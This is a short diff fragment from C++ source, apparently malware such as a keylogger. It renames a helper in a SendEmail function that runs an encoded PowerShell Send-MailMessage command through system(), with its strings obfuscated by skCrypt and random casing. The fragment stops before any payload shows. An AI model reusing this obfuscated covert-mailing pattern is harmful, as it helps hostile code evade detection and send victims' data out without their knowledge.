@@ -9,7 +9,7 @@ bool IsConnected2Internet() {
 }
 
 void SendEmail() {
-    system(RunPSEncCommand(
+    system(RunEncCommand(
         (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
         (string)skCrypt("' -tO '") + RECEIVERMAIL +
         (string)skCrypt("' -SuBJect '") + EMAILSUBJECT +
